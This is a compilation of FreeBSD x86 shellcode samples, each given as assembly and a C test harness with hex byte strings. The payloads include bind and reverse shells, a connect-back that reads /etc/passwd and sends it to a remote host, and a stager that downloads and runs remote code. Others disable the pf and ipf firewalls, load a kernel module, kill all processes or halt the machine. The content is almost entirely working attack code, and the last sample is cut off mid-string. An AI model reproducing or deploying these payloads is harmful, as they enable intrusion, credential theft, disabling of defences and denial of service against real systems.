
/*

FreeBSD reboot() shellcode

This will halt a system, which takes it offline until someone reboots it.

Written by zillion (at safemode.org

*/

char shellcode[] =
        "\x31\xc0\x66\xba\x0e\x27\x66\x81\xea\x06\x27\xb0\x37\xcd\x80";

int main()
{

  int *ret;
  ret = (int *)&ret + 2;
  (*ret) = (int)shellcode;
}






////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////


/*

FreeBSD reboot() shellcode

This will halt a system, which takes it offline until someone reboots it.

Written by zillion (at safemode.org

*/

char shellcode[] =
        "\x31\xc0\x66\xba\x0e\x27\x66\x81\xea\x06\x27\xb0\x37\xcd\x80";

int main()
{

  int *ret;
  ret = (int *)&ret + 2;
  (*ret) = (int)shellcode;
}




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////


/*

 FreeBSD shellcode that binds /bin/sh to port 41254
 Assembly code and explanation will be released on safemode.org soon.

 Written by zillion (zillion at safemode.org)

*/

char shellcode[] =
        "\xeb\x64\x5e\x31\xc0\x88\x46\x07\x6a\x06\x6a\x01\x6a\x02\xb0"
        "\x61\x50\xcd\x80\x89\xc2\x31\xc0\xc6\x46\x09\x02\x66\xc7\x46"
        "\x0a\xa1\x26\x89\x46\x0c\x6a\x10\x8d\x46\x08\x50\x52\x31\xc0"
        "\xb0\x68\x50\xcd\x80\x6a\x01\x52\x31\xc0\xb0\x6a\x50\xcd\x80"
        "\x31\xc0\x50\x50\x52\xb0\x1e\x50\xcd\x80\xb1\x03\xbb\xff\xff"
        "\xff\xff\x89\xc2\x43\x53\x52\xb0\x5a\x50\xcd\x80\x80\xe9\x01"
        "\x75\xf3\x31\xc0\x50\x50\x56\xb0\x3b\x50\xcd\x80\xe8\x97\xff"
        "\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x23";

int main()
{

  int *ret;
  ret = (int *)&ret + 2;
  (*ret) = (int)shellcode;
}





////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

                   ***(C)oDed bY suN8Hclf***
               DaRk-CodeRs Group production, kid
     [FreeBSD x86 setreuid(0, 0) + execve(pfctl -d) 56 bytes]

The simples way to disable the FreeBSD's packet filter. We do not
flush all rules (pfctl -F all) but only turn the firewall off.

Assembly code:
-------------------------code.asm--------------------------
section .text
global _start

_start:

	xor eax, eax
	push eax
	push eax
	mov al, 126
	push eax
	int 0x80           ; setreuid()

	xor eax, eax
	push eax
	push word 0x642d
	mov ecx, esp       ; ecx contains a pointer to "-d" string

	push eax 
	push 0x6c746366
	push 0x702f6e69
	push 0x62732f2f
	mov ebx, esp       ; ebx contains a pointer to "//sbin/pfctl" string

	push eax
	push ecx
	push ebx
	mov ecx, esp

	push eax
	push ecx
	push ebx
	mov al, 0x3b
	push eax
	int 0x80          ; execve()

	xor eax, eax
	push eax
	push eax
	int 0x80          ; exit()
-------------------------code.asm--------------------------
And C code:
-------------------------code.c----------------------------
#include "stdio.h"

char shellcode[]=
"\x31\xc0\x50\x50\xb0\x7e\x50\xcd\x80\x31\xc0\x50\x66\x68\x2d\x64" 
"\x89\xe1\x50\x68\x66\x63\x74\x6c\x68\x69\x6e\x2f\x70\x68\x2f\x2f"
"\x73\x62\x89\xe3\x50\x51\x53\x89\xe1\x50\x51\x53\xb0\x3b\x50\xcd"
"\x80\x31\xc0\x50\x50\xcd\x80";

int main(int argc, char *argv[]){
	int (*func)();
	func=(int (*)())shellcode;
	(int)(*func)();
}
-------------------------code.c----------------------------

Greetz to: 0in, cOndemned (and to other DaRk-CodeRs members), str0ke, e.wiZz!, 
           Katharsis, doctor and many others...
Visit us : www.dark-coders.pl




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

            ***(C)oDed bY suN8Hclf***
       DaRk-CodeRs Group productions, kid
 [FreeBSD x86 kill all procesess 12 bytes shellcode]


Compile:
nasm -f elf code.asm
ld -e _start -o code code.o

Assembly code:
---------------------code.asm-------------------
section .text
global _start

_start:
xor eax, eax
push byte 9 ; SIGKILL
dec eax
push eax    ; -1 (0xffffffff)
inc eax
mov al, 37  ;kill() syscall number, check /usr/src/sys/kern/syscalls.master for details
push eax
int 0x80
---------------------code.asm-------------------

And C code:
---------------------code.c---------------------
#include "stdio.h"

char shellcode[]=
"\x31\xc0\x6a\x09\x48\x50\x40\xb0\x25\x50\xcd\x80";

int main()
{
int (*func)();
func=(int (*)())shellcode;
(int)(*func)();
}
---------------------code.c---------------------


Greetz: all DaRk-CodeRs guys, e.wiZz!, doctor
Visit : www.dark-coders.pl




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

                           ***(C)oDed bY suN8Hclf***
                       DaRk-CodeRs Group production, kid
           [FreeBSD x86 connect back.send.exit /etc/passwd 112 bytes]

This is the FreeBSD version of 0in's shellcode (http://milw0rm.com/shellcode/6263)
(really learnt a lot while coding this one ;])

Compile:
nasm -f elf shellcode.asm
ld -e _start -o shellcode shellcode.o
================================================================================
How it works:
1st terminal:  $nc -l 8000
2nd terminal:  $./shellcode
2nd terminal:
# $FreeBSD: src/etc/master.passwd,v 1.40 2005/06/06 20:19:56 brooks Exp $
#
root:*:0:0:Charlie &:/root:/bin/csh
toor:*:0:0:Bourne-again Superuser:/root:
daemon:*:1:1:Owner of many system processes:/root:/usr/sbin/nologin
operator:*:2:5:System &:/:/usr/sbin/nologin
bin:*:3:7:Binaries Commands and Source:/:/usr/sbin/nologin
tty:*:4:65533:Tty Sandbox:/:/usr/sbin/nologin
kmem:*:5:65533:KMem Sandbox:/:/usr/sbin/nologin
games:*:7:13:Games pseudo-user:/usr/games:/usr/sbin/nologin
news:*:8:8:News Subsystem:/:/usr/sbin/nologin
man:*:9:9:Mister Man Pages:/usr/share/man:/usr/sbin/nologin
sshd:*:22:22:Secure Shell Daemon:/var/empty:/usr/sbin/nologin
smmsp:*:25:25:Sendmail Submission User:/var/spool/clientmqueue:/usr/sbin/nologin
mailnull:*:26:26:Sendmail Default User:/var/spool/mqueue:/usr/sbin/nologin
bind:*:53:53:Bind Sandbox:/:/usr/sbin/nologin
[..]
================================================================================
Code:
-------------------------code.asm---------------------
section .text
global _start

_start:
xor eax, eax
push byte 0x64
push word 0x7773
push 0x7361702f
push 0x6374652f   ;file to open (default:/etc/passwd)
mov ebx, esp
push eax
push ebx
mov al, 5         ;use: 'cat /usr/src/sys/kern/syscalls.master | grep *' to get the right numbers
push eax
int 0x80          ;open()

mov ebx, eax      ;file descriptor to ebx
xor eax, eax      ;we should clean eax each time we return from int 0x80 
xor ecx, ecx

mov cx, 3333      ;3333 bytes is probably enough
push ecx
mov esi, esp      ;put our data on the stack
push esi
push ebx
mov al, 3
push eax
int 0x80          ;read()

mov ebp, eax
xor eax, eax
mov al, 6
push ebx
push eax
int 0x80          ;close()

xor eax, eax
push eax
push byte 0x01
push byte 0x02
mov al, 97
push eax
int 0x80          ;socket()

mov edx, eax      ;socket descriptor to edx

push 0x2101a8c0   ;192.168.1.33, change IT!!!
push 0x401f02AA   ;port 8000
mov eax, esp

push byte 0x10
push eax
push edx
xor eax, eax
mov al, 98
push eax
int 0x80         ;connect()

xor eax, eax
push ebp
push esi         ;our buffer with data
push edx
mov al, 4
push eax
int 0x80         ;write()

xor eax, eax
inc eax
push eax
push eax
int 0x80         ;exit()
-------------------------code.asm---------------------

C Code:
-------------------------code.c-----------------------
#include <stdio.h>

char shellcode[]=
"\x31\xc0\x6a\x64\x66\x68\x73\x77\x68\x2f\x70\x61\x73\x68\x2f\x65\x74\x63"
"\x89\xe3\x50\x53\xb0\x05\x50\xcd\x80\x89\xc3\x31\xc0\x31\xc9\x66\xb9\x05"
"\x0d\x51\x89\xe6\x56\x53\xb0\x03\x50\xcd\x80\x89\xc5\x31\xc0\xb0\x06\x53"
"\x50\xcd\x80\x31\xc0\x50\x6a\x01\x6a\x02\xb0\x61\x50\xcd\x80\x89\xc2"
"\x68\xc0\xa8\x01\x21"   //<- host address
"\x68\xaa\x02\x1f\x40"  // <- port number
"\x89\xe0\x6a\x10\x50\x52\x31\xc0\xb0\x62\x50\xcd\x80\x31\xc0\x55\x56\x52"
"\xb0\x04\x50\xcd\x80\x31\xc0\x40\x50\x50\xcd\x80";

int main(int argc, char **argv) {
	int (*func)();
	func=(int (*)())shellcode;
	(int)(*func)();
}
-------------------------code.c-----------------------

Greetz to: 0in, cOndemned, e.wiZz!, str0ke, doctor
Visit us : www.dark-coders.pl




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

; sm4x - 2008
; setuid(0); execve("//sbin/ipf", {"//sbin/ipf", "-Faa", 0}, 0);
; 57 bytes
; FreeBSD 7.0-RELEASE

global _start

_start:
main:

; --------------------- setuid (0)
xor     eax, eax
xor     ecx, ecx
push    eax
push        eax
mov     al, 0x17
int     0x80
; --------------------- -Faa
xor     eax, eax
push    eax
push    0x6161462d      ; -Faa
mov     ecx, esp

; --------------------- setup //sbin/ipf
push    eax
push    word 0x6670
push    0x692f6e69
push    0x62732f2f
mov     ebx, esp

; ---------------------- array setup
push    eax
push    ecx
push    ebx
mov     ecx, esp

; ---------------------- call to execve
push    eax
push    ecx
push    ebx

mov     al, 0x3b
push    eax
int     0x80

xor     eax, eax
push    eax
push    eax
int     0x80

/*

char code[] = "\x31\xc0\x31\xc9\x50\x50\xb0\x17\xcd\x80"
              "\x31\xc0\x50\x68\x2d\x46\x61\x61\x89\xe1"
              "\x50\x66\x68\x70\x66\x68\x69\x6e\x2f\x69"
              "\x68\x2f\x2f\x73\x62\x89\xe3\x50\x51\x53"
              "\x89\xe1\x50\x51\x53\xb0\x3b\x50\xcd\x80"
              "\x31\xc0\x50\x50\xcd\x80";

int main(int argc, char **argv) {
        int (*func)();
        printf("Bytes: %d\n", sizeof(code));
        func = (int (*)()) code;
}

*/




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

; sm4x - 2008
; reverse portbind /bin/sh
; NULL free if address is.
; setuid(0); socket(); connect(); exit();
; 89 bytes
; FreeBSD 7.0-RELEASE

global _start
_start:

xor     eax, eax

; --- setuid(0)
push    eax
push    eax
mov     al, 0x17
push    eax
int     0x80

; --- socket()
push    eax
push    byte 0x01
push    byte 0x02
mov     al, 0x61
push    eax
int     0x80
mov     edx, eax

; --- sockaddr_in
push    0x0100007f      ; 1.0.0.127 nb: to change see below
push    0x401f02AA      ; 8000 nb: change (watch for .10 .0 etc..)
mov     eax, esp

; --- setup connect(edx, eax, 0x10);
push    byte 0x10
push    eax
push    edx
xor     eax, eax
mov     al, 0x62
push    eax
int     0x80

; -- dup2(0+1+2)..
mov     cl, 0x03
xor     ebx, ebx
dups:
push    ebx
push    edx
mov     al, 0x5a
push    eax
int     0x80
inc     ebx
loop   dups

xor     eax, eax
push    eax     ; null
push    0x68732f6e
push    0x69622f2f
mov     ebx, esp

; --- execve()
push    ebx
push    eax
push    esp
push    ebx
mov     al, 0x3b
push    eax
int     0x80

; --- exit
xor     eax, eax
push    eax
push    eax
int     0x80

/*

char code[] = "\x31\xc0\x50\x50\xb0\x17\x50\xcd\x80"
       "\x50\x6a\x01\x6a\x02\xb0\x61\x50\xcd"
       "\x80\x89\xc2\x68\x7f\x00\x00\x01\x68"
       "\x00\x02\x1f\x40\x89\xe0\x6a\x10\x50"
       "\x52\x31\xc0\xb0\x62\x50\xcd\x80\xb1"
       "\x03\x31\xdb\x53\x52\xb0\x5a\x50\xcd"
       "\x80\x43\xe2\xf6\x31\xc0\x50\x68\x6e"
       "\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89"
       "\xe3\x53\x50\x54\x53\xb0\x3b\x50\xcd"
       "\x80\x31\xc0\x50\x50\xcd\x80";

int main(int argc, char **argv) {

    	/* used to get ip:port combo for pushes */
        char *ip_addr = "127.0.0.1"; // watch for addresses that create \x00 and others
        int port = 8000;
        struct sockaddr_in dest;

        printf("IP: %s\n", ip_addr);
        printf("PORT: %d\n", port);

        dest.sin_family = AF_INET;
        dest.sin_port=htons(port);
        dest.sin_addr.s_addr = inet_addr(ip_addr);

        printf("push 0x%x\t; host\n", dest.sin_addr.s_addr);
        printf("push 0x%x02AA\t; port\n", dest.sin_port);

        int (*func)();
        printf("Bytes: %d\n", sizeof(code));
        func = (int (*)()) code;
        (int)(*func)();
}

*/




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

; sm4x - 2008
; reverse portbind /bin/sh
; NULL free if address is.
; setuid(0); socket(); connect(); exit();
; 89 bytes
; FreeBSD 7.0-RELEASE

global _start
_start:

xor     eax, eax

; --- setuid(0)
push    eax
push    eax
mov     al, 0x17
push    eax
int     0x80

; --- socket()
push    eax
push    byte 0x01
push    byte 0x02
mov     al, 0x61
push    eax
int     0x80
mov     edx, eax

; --- sockaddr_in
push    0x0100007f      ; 1.0.0.127 nb: to change see below
push    0x401f02AA      ; 8000 nb: change (watch for .10 .0 etc..)
mov     eax, esp

; --- setup connect(edx, eax, 0x10);
push    byte 0x10
push    eax
push    edx
xor     eax, eax
mov     al, 0x62
push    eax
int     0x80

; -- dup2(0+1+2)..
mov     cl, 0x03
xor     ebx, ebx
dups:
push    ebx
push    edx
mov     al, 0x5a
push    eax
int     0x80
inc     ebx
loop   dups

xor     eax, eax
push    eax     ; null
push    0x68732f6e
push    0x69622f2f
mov     ebx, esp

; --- execve()
push    ebx
push    eax
push    esp
push    ebx
mov     al, 0x3b
push    eax
int     0x80

; --- exit
xor     eax, eax
push    eax
push    eax
int     0x80

/*

char code[] = "\x31\xc0\x50\x50\xb0\x17\x50\xcd\x80"
       "\x50\x6a\x01\x6a\x02\xb0\x61\x50\xcd"
       "\x80\x89\xc2\x68\x7f\x00\x00\x01\x68"
       "\x00\x02\x1f\x40\x89\xe0\x6a\x10\x50"
       "\x52\x31\xc0\xb0\x62\x50\xcd\x80\xb1"
       "\x03\x31\xdb\x53\x52\xb0\x5a\x50\xcd"
       "\x80\x43\xe2\xf6\x31\xc0\x50\x68\x6e"
       "\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89"
       "\xe3\x53\x50\x54\x53\xb0\x3b\x50\xcd"
       "\x80\x31\xc0\x50\x50\xcd\x80";

int main(int argc, char **argv) {

    	/* used to get ip:port combo for pushes */
        char *ip_addr = "127.0.0.1"; // watch for addresses that create \x00 and others
        int port = 8000;
        struct sockaddr_in dest;

        printf("IP: %s\n", ip_addr);
        printf("PORT: %d\n", port);

        dest.sin_family = AF_INET;
        dest.sin_port=htons(port);
        dest.sin_addr.s_addr = inet_addr(ip_addr);

        printf("push 0x%x\t; host\n", dest.sin_addr.s_addr);
        printf("push 0x%x02AA\t; port\n", dest.sin_port);

        int (*func)();
        printf("Bytes: %d\n", sizeof(code));
        func = (int (*)()) code;
        (int)(*func)();
}

*/




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
; sm4x - 2008
; reverse connect dl(shellcode) and execute, exit
;  - i've used this to feed pwnd progs huge messy shellcode ret'ing the results over nc ;)
;  - feed it with a $nc -vvl -p8000 <shellcode_in_file
; setuid(0); socket(); connect(); dups(); recv(); jmp; exit();
; 90 bytes (NULL free dep on remote address)
; FreeBSD 7.0-RELEASE

global _start
_start:

xor     eax, eax

; --- setuid(0)
push    eax
push    eax
mov     al, 0x17
push    eax
int     0x80

; --- socket()
push    eax
push    byte 0x01
push    byte 0x02
mov     al, 0x61
push    eax
int     0x80
mov     edx, eax

; --- sockaddr_in setup
push    0x90011ac      ; host 172.17.0.9 (.0. is a NULL)
push    0x401f02AA     ; port 8000
mov     eax, esp

; --- setup connect(edx, eax, 0x10);
push    byte 0x10
push    eax
push    edx
xor     eax, eax
mov     al, 0x62
push    eax
int     0x80
jne     done

; --- dup2(0+1+2) - remove if you dont want results sent over the wire
mov     cl, 0x03
xor     ebx, ebx
dups:
push    ebx
push    edx
mov     al, 0x5a
push    eax
int     0x80
inc     ebx
loop    dups

; --- recv(fd, *buf, 1028);
xor     eax, eax
push    word 0x0404      ; conf read size here
lea     ecx, [esp-0x0404] ; and here
push    ecx          
push    edx
mov     al, 0x03
push    eax
int     0x80

; --- jmp to recv shellcode
jmp     ecx          ; run shellcode
done:

; --- exit (optional -> pls exit from jmp shellcode)
xor     eax, eax
inc     eax
push    eax
push    eax
int     0x80

*/

#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>

char code[] = "\x31\xc0\x50\x50\xb0\x17\x50\xcd\x80\x50"
       "\x6a\x01\x6a\x02\xb0\x61\x50\xcd\x80\x89"
       "\xc2\x68\xac\x11\x00\x09\x68\xaa\x02\x1f"
       "\x40\x89\xe0\x6a\x10\x50\x52\x31\xc0\xb0"
       "\x62\x50\xcd\x80\x75\x24\xb1\x03\x31\xdb"
       "\x53\x52\xb0\x5a\x50\xcd\x80\x43\xe2\xf6"
       "\x31\xc0\x66\x68\x04\x04\x8d\x8c\x24\xfc"
       "\xfb\xff\xff\x51\x52\xb0\x03\x50\xcd\x80"
       "\xff\xe1\x31\xc0\x40\x50\x50\xcd\x80";

int main(int argc, char **argv) {       
 int (*func)();
 printf("Bytes: %d\n", sizeof(code));
 func = (int (*)()) code;
 (int)(*func)(); 
}




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

; sm4x 2008
; /bin/cat /etc/master.passwd
; 65 bytes
; FreeBSD 7.0-RELEASE

global _start
_start:

xor     eax, eax

; --- setuid(0)
push    eax
push    eax
mov     al, 0x17
int     0x80

; --- setup /etc/master.passwd
jmp     short   load_file
ok:
pop     esi

; setup /bin/cat
push    eax
push    0x7461632f
push    0x6e69622f
mov     ebx, esp

; --- array setup
push    eax     ; null
push    esi     ; /etc/master.passwd
push    ebx     ; /bin/cat
mov     edx, esp

; -- execve()
push    eax     ; 0
push    edx     ; array { "/bin/cat", "/etc/master.passwd", 0}
push    ebx     ; /bin/cat
mov     al, 0x3b
push    eax
int     0x80

; --- exit
push    eax
push    eax
int     0x80

load_file:
call    ok
db      '/etc/master.passwd'

/*

char code[] = "\x31\xc0\x50\x50\xb0\x17\xcd\x80\xeb\x1f"
       "\x5e\x50\x68\x2f\x63\x61\x74\x68\x2f\x62"
       "\x69\x6e\x89\xe3\x50\x56\x53\x89\xe2\x50"
       "\x52\x53\xb0\x3b\x50\xcd\x80\x50\x50\xcd"
       "\x80\xe8\xdc\xff\xff\xff\x2f\x65\x74\x63"
       "\x2f\x6d\x61\x73\x74\x65\x72\x2e\x70\x61"
       "\x73\x73\x77\x64";

int main(int argc, char **argv) {
        int (*func)();
        printf("Bytes: %d\n", sizeof(code));
        func = (int (*)()) code;
        (int)(*func)();
}

*/




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*-
 * Copyright (c) 2009, Sofian Brabez <sbz@6dev.net>
 *
 * freebsd-x86-portbind.c - FreeBSD x86 portbind a shell (/bin/sh) on
1337 (\x05\x39) 167 bytes
 */
 
const char shellcode[] =
    "\x6a\x00"                  // push   $0x0
    "\x6a\x01"                  // push   $0x1
    "\x6a\x02"                  // push   $0x2
    "\x50"                      // push   %eax
    "\x6a\x61"                  // push   $0x61
    "\x58"                      // pop    %eax
    "\xcd\x80"                  // int    $0x80
    "\x50"                      // push   %eax
    "\x6a\x00"                  // push   $0x0
    "\x6a\x00"                  // push   $0x0
    "\x6a\x00"                  // push   $0x0
    "\x6a\x00"                  // push   $0x0
    "\x68\x10\x02\x05\x39"      // push   $0x39050210
    "\x89\xe0"                  // mov    %esp,%eax
    "\x6a\x10"                  // push   $0x10
    "\x50"                      // push   %eax
    "\xff\x74\x24\x1c"          // pushl  0x1c(%esp)
    "\x50"                      // push   %eax
    "\x6a\x68"                  // push   $0x68
    "\x58"                      // pop    $eax
    "\xcd\x80"                  // int    $0x80
    "\x6a\x01"                  // push   $0x1
    "\xff\x74\x24\x28"          // pushl  0x28(%esp)
    "\x50"                      // push   %eax
    "\x6a\x6a"                  // push   $0x6a
    "\x58"                      // pop    $eax
    "\xcd\x80"                  // int    $0x80
    "\x83\xec\x10"              // sub    $0x10,$esp
    "\x6a\x10"                  // push   $0x10
    "\x8d\x44\x24\x04"          // lea    0x4(%esp),%eax
    "\x89\xe1"                  // mov    %esp,%ecx
    "\x51"                      // push   %ecx
    "\x50"                      // push   %eax
    "\xff\x74\x24\x4c"          // pushl  0x4c(%esp)
    "\x50"                      // push   %eax
    "\x6a\x1e"                  // push   %0x1e
    "\x58"                      // pop    %eax
    "\xcd\x80"                  // int    $0x80
    "\x50"                      // push   %eax
    "\xff\x74\x24\x58"          // pushl  0x58(%esp)
    "\x50"                      // push   %eax
    "\x6a\x06"                  // push   $0x6
    "\x58"                      // pop    %eax
    "\xcd\x80"                  // int    $0x80
    "\x6a\x00"                  // push   $0x0
    "\xff\x74\x24\x0c"          // pushl  0xc(%esp)
    "\x50"                      // push   %eax
    "\x6a\x5a"                  // push   $0x5a
    "\x58"                      // pop    %eax
    "\xcd\x80"                  // int    $0x80
    "\x6a\x01"                  // push   $0x1
    "\xff\x74\x24\x18"          // pushl  0x18(%esp)
    "\x50"                      // push   %eax
    "\x6a\x5a"                  // push   $0x5a
    "\x58"                      // pop    %eax
    "\xcd\x80"                  // int    $0x80
    "\x6a\x02"                  // push   $0x2
    "\xff\x74\x24\x24"          // pushl  0x24(%esp)
    "\x50"                      // push   %eax
    "\x6a\x5a"                  // push   $0x5a
    "\x58"                      // pop    %eax
    "\xcd\x80"                  // int    $0x80
    "\x68\x73\x68\x00\x00"      // push   $0x6873
    "\x89\xe0"                  // mov    %esp,%eax
    "\x68\x2d\x69\x00\x00"      // push   $0x692d
    "\x89\xe1"                  // mov    %esp,%ecx
    "\x6a\x00"                  // push   $0x0
    "\x51"                      // push   %ecx
    "\x50"                      // push   %eax
    "\x68\x2f\x73\x68\x00"      // push   $0x68732f
    "\x68\x2f\x62\x69\x6e"      // push   $0x6e69622f
    "\x89\xe0"                  // mov    %esp,%eax
    "\x8d\x4c\x24\x08"          // lea    0x8(%esp),%ecx
    "\x6a\x00"                  // push   $0x0
    "\x51"                      // push   %ecx
    "\x50"                      // push   %eax
    "\x50"                      // push   %eax
    "\x6a\x3b"                  // push   $0x3b
    "\x58"                      // pop    %eax
    "\xcd\x80";                 // int    $0x80
 
int main(void) {
    void (*egg)() = (void *)shellcode;
 
    return (*(int(*)())shellcode)();
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/* This is FreeBSD execve() code.It is 37 bytes long.I'll try to make it *
 * smaller.Till then use this one.                                       *
 *                                       signed predator                 *
 *                                       preedator(at)sendmail(dot)ru    *
 *************************************************************************/

char FreeBSD_code[]=
"\xeb\x17\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\x50\x8d"
"\x53\x08\x52\x53\xb0\x3b\x50\xcd\x80\xe8\xe4\xff\xff\xff/bin/sh";

int main(){
 int *ret=(int *)(&ret+2);
 printf("len : %d\n",strlen(FreeBSD_code));
 *ret=(int)FreeBSD_code;
}

/*****************************************
 *int main(){                            *
 *   __asm__("jmp  callme         \n"    *
 *           "jmpme:              \n"    *
 *           "pop %ebx            \n"    *
 *           "xorl %eax,%eax      \n"    *
 *           "movb %al,0x7(%ebx)  \n"    *
 *           "movl %ebx,0x8(%ebx) \n"    *
 *	     "movl %eax,0xc(%ebx) \n"    *
 *           "push %eax           \n"    *
 *	     "leal 0x8(%ebx),%edx \n"    *
 *	     "push %edx           \n"    *
 *	     "push %ebx           \n"    *
 *	     "movb $0x3b,%al      \n"    *
 *           "push %eax	          \n"    *
 *           "int $0x80           \n"    *
 *           "callme:	          \n"    *
 *           "call jmpme          \n"    *
 *           ".string \"/bin/sh\" \n");  *
 *}                                      *
 *****************************************/





////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/* FreeBSD 23 byte execve code. Greetz to anathema, the first who published  *
 * this way of writing shellcodes.                                           *
 *  greetz to preedator                              marcetam                *
 *                                                admin@marcetam.net         *
 ****************************************************************************/


char fbsd_execve[]=
  "\x99"                  /* cdq              */
  "\x52"                  /* push %edx        */
  "\x68\x6e\x2f\x73\x68"  /* push $0x68732f6e */
  "\x68\x2f\x2f\x62\x69"  /* push $0x69622f2f */
  "\x89\xe3"              /* movl %esp,%ebx   */
  "\x51"                  /* push %ecx - or %edx :) */
  "\x52"                  /* push %edx - or %ecx :) */
  "\x53"                  /* push %ebx        */
  "\x53"                  /* push %ebx        */
  "\x6a\x3b"              /* push $0x3b       */
  "\x58"                  /* pop %eax         */
  "\xcd\x80";             /* int $0x80        */


int main() {
  void (*run)()=(void *)fbsd_execve;
  printf("%d bytes \n",strlen(fbsd_execve));
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/* The kldload shellcode
   setuid(0)
   loads /tmp/o.o kernel module

   Size	74 bytes
   OS   FreeBSD
		/rootteam/dev0id 	(www.sysworld.net)
			dev0id@uncompiled.com

BITS	32
jmp	short	callme
main:
	pop	esi
	xor	eax,eax
	mov	al,0x17
	push	eax
	int	0x80
	xor	eax,eax
	push	eax
	push long	0x68732f6e
	push long	0x69622f2f
	mov	ebx,esp
	push	eax
	push word	0x632d
	mov	edi,esp
	push	eax
	push	esi
	push	edi
	push	ebx
	mov	edi,esp
	push	eax
	push	edi
	push	ebx
	push	eax
	mov	al,0x3b
	int	0x80
callme:
	call	main
	db	'/sbin/kldload /tmp/o.o'
*/

char shellcode[] =
	"\xeb\x2c\x5e\x31\xc0\xb0\x17\x50\xcd\x80\x31\xc0\x50\x68\x6e"
	"\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x66\x68\x2d\x63"
	"\x89\xe7\x50\x56\x57\x53\x89\xe7\x50\x57\x53\x50\xb0\x3b\xcd"
	"\x80\xe8\xcf\xff\xff\xff\x2f\x73\x62\x69\x6e\x2f\x6b\x6c\x64"
	"\x6c\x6f\x61\x64\x20\x2f\x74\x6d\x70\x2f\x6f\x2e\x6f";

int
main(void)
{
	int *ret;
	ret = (int*)&ret+2;
	(*ret) = shellcode;
}




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*

Encoded SUB shellcode execve /bin/sh of 48 bytes
by anderson_underground@hotmail.com <c0d3_z3r0>

Hack 'n Roll

*/


char shellcode[] =
"\x31\xd2"
"\xeb\x0e"
"\x31\xdb"
"\x5b"
"\xb1\x19"
"\x83\x2c\x1a\x01"
"\x42"
"\xe2\xf9"
"\xeb\x05"
"\xe8\xed\xff\xff\xff"
"\x32\xc1"
"\x51"
"\x69\x30\x30\x74\x69\x69"
"\x30\x63\x6a"
"\x6f"
"\x32\xdc"
"\x8a\xe4"
"\x51"
"\x55"
"\x54"
"\x51"
"\xb1\x3c"
"\xce"
"\x81";


main(){
printf("Length: %d\n",strlen(shellcode));
asm("call shellcode");
}




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/* 
 * Title: FreeBSD 8.0-RELEASE/x86 '//sbin/pfctl -F all Shellcode 47 Bytes'
 * Type: Shellcode
 * Author: antrhacks
 * Platform: FreeBSD 8.0-RELEASE
*/

/* ASSembly
 31 c0                	xor    %eax,%eax
 50                   	push   %eax
 68 2d 46 61 6c       	push   $0x6c61462d
 89 e1                	mov    %esp,%ecx
 50                   	push   %eax
 68 66 63 74 6c       	push   $0x6c746366
 68 69 6e 2f 70       	push   $0x702f6e69
 68 2f 2f 73 62       	push   $0x62732f2f
 89 e3                	mov    %esp,%ebx
 50                   	push   %eax
 51                   	push   %ecx
 53                   	push   %ebx
 89 e1                	mov    %esp,%ecx
 50                   	push   %eax
 51                   	push   %ecx
 53                   	push   %ebx
 b0 3b                	mov    $0x3b,%al
 50                   	push   %eax
 cd 80                	int    $0x80
 31 c0                	xor    %eax,%eax
 50                   	push   %eax
 50                   	push   %eax
 cd 80                	int    $0x80
*/


#include <stdio.h>

int main(){
char shellcode[] = "\x31\xc0\x50\x68\x2d\x46\x61\x6c\x89\xe1\x50\x68\x66\x63\x74\x6c"
"\x68\x69\x6e\x2f\x70\x68\x2f\x2f\x73\x62\x89\xe3\x50\x51\x53"
"\x89\xe1\x50\x51\x53\xb0\x3b\x50\xcd\x80\x31\xc0\x50\x50\xcd\x80"; 

 printf("[*] ShellCode size (bytes): %d\n\n", sizeof(shellcode)-1 );

(*(void (*)())shellcode)();

return 0;
}




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
 -------------- FreeBSD/x86 - portbind shell + fork (111 bytes)--------------------
 *  AUTHOR : Tosh
 *   OS    : BSDx86 (Tested on FreeBSD 8.1)
 *   EMAIL : tosh@tuxfamily.org
 */



#include <stdio.h>
#include <string.h>
#include <arpa/inet.h>

char shellcode [] = "\x31\xc9\xf7\xe1\x51\x40\x50\x40\x50\x50\xb0\x61\xcd\x80\x96\x52\x66"
                    "\x68\x05\x39\x66\x68\x01\x02\x89\xe1\x6a\x10\x51\x56\x50\xb0\x68\xcd"
                    "\x80\x31\xc0\xb0\x05\x50\x56\x50\xb0\x6a\xcd\x80\x31\xc0\x50\x50\x56"
                    "\x50\xb0\x1e\xcd\x80\x97\x31\xc0\x50\xb0\x02\xcd\x80\x09\xc0\x74\xea"
                    "\x31\xc9\x31\xc0\x51\x57\x50\xb0\x5a\xcd\x80\xfe\xc1\x80\xf9\x03\x75"
